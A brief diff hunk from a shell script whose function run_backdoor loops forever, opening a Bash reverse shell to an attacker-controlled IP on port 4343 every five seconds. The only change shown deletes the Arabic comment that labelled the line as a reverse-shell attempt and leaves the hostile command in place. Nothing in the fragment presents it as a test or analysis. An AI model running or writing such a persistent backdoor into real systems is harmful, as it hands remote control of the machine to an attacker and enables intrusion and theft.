@@ -7,7 +7,6 @@ run_backdoor() {
     ATTACKER_PORT="4343"
 
     while true; do
-        # محاولة الاتصال (Bash Reverse Shell)
         bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
         
         sleep 5
